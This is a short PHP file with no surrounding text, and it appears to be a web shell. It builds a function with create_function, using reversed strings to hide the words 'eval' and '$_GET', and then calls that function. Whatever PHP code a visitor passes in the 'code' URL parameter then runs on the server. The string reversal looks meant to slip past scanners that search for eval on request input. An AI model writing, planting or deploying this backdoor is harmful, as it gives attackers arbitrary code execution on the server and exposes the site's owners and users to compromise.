
<?php

    $function = create_function('$code',strrev('lave').'('.strrev('TEG_$').'["code"]);');

    $function();

?>
